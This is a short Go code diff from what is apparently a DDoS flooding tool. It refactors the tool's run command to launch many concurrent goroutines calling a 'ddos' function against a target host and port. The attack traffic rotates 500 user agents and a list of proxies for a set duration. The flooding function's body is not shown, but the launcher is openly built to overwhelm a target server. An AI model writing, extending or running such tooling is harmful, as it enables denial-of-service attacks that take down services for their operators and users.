@@ -2,7 +2,6 @@ package main
 
 import (
 	"runtime"
-	"strconv"
 	"time"
 
 	"github.com/mkideal/cli"
@@ -28,13 +27,13 @@ var runCommand = &cli.Command{
 	Fn: func(ctx *cli.Context) error {
 		runtime.GOMAXPROCS(runtime.NumCPU())
 		argv := ctx.Argv().(*runT)
-		ua := getUserAgents(500)
-		port := strconv.Itoa(argv.Port)
+		useragents := getUserAgents(500)
 		proxies := readLines(argv.File)
 		for i := 0; i < argv.Thread; i++ {
-			go prepareRequests(argv.Host, port, ua, proxies, argv.Path, argv.Method)
+			go ddos(argv.Host, argv.Port, argv.Method, argv.Path, useragents, proxies)
 		}
 		time.Sleep(time.Duration(argv.Duration) * time.Second)
+
 		return nil
 	},
 }
